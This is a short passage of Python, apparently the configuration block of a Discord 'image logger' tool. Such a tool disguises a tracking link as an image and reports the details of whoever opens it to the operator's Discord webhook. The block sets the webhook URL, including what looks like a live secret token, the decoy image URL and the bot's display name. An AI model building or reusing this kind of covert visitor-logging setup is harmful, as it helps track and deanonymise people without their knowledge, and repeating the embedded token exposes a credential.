...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1082673689566384208/00FozArIg5KnrUQcRWVzV4k-Maf4fua8WqsGHB10VppYUCYTcMuSypAotF4_gw-eJe_R",
    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Roi Discord Power", # Set this to the name you want the webhook to have
